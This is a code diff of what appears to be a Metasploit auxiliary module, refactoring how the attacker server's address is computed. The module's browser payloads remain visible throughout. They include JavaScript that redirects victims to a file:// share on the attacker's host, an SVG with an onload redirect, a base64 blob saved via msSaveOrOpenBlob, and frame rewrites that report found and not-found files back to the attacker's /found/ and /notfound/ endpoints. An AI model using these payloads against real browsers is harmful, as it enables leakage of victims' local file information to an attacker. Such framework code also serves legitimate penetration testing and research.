@@ -51,12 +51,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def js
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     %Q|function report() {
   if(window.location.protocol != 'file:') {
     try {
-      window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
+      window.location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html';
     } catch (e) { }
     return;
   }
@@ -65,10 +63,10 @@ class MetasploitModule < Msf::Auxiliary
   for(var i = 0; i < frames.length; i++) {
   try {
       if(frames[i].name == 'notfound') {
-        frames[i].src = 'http://#{my_host}/notfound/?f=' + frames[i].src;
+        frames[i].src = 'http://#{srvhost_addr}/notfound/?f=' + frames[i].src;
       }
       else {
-        frames[i].src = 'http://#{my_host}/found/?f=' + frames[i].src;
+        frames[i].src = 'http://#{srvhost_addr}/found/?f=' + frames[i].src;
       }
     } catch(e) { }
   }
@@ -98,10 +96,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def svg
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     %Q|<!-- saved from url=(0014)about:internet -->
-<svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
+<svg width="100px" height="100px" version="1.1" onload="try{ location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html'; } catch(e) { }" xmlns="http://www.w3.org/2000/svg"></svg>|
   end
 
   def is_target_suitable?(user_agent)
@@ -118,8 +114,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_request_uri(cli, request)
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-
     case request.method
     when 'OPTIONS'
       process_options(cli, request)
@@ -151,7 +145,7 @@ class MetasploitModule < Msf::Auxiliary
 <head>
 <script type="text/javascript">
   try {
-    window.location.href = 'file://#{my_host}/#{datastore['SHARENAME']}/index.html';
+    window.location.href = 'file://#{srvhost_addr}/#{datastore['SHARENAME']}/index.html';
   } catch (e) {
     blob = new Blob([atob('#{Rex::Text.encode_base64(svg)}')]);
     window.navigator.msSaveOrOpenBlob(blob, 'image.svg');
@@ -204,13 +198,8 @@ class MetasploitModule < Msf::Auxiliary
   def process_propfind(cli, request)
     path = request.uri
     print_status("PROPFIND #{path}")
-    body = ''
-
-    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
-    my_uri = "http://#{my_host}/"
 
     if path !~ /\/$/
-
       if path.index(".")
         print_status "PROPFIND => 207 File (#{path})"
         body = %Q|<?xml version="1.0" encoding="utf-8"?>
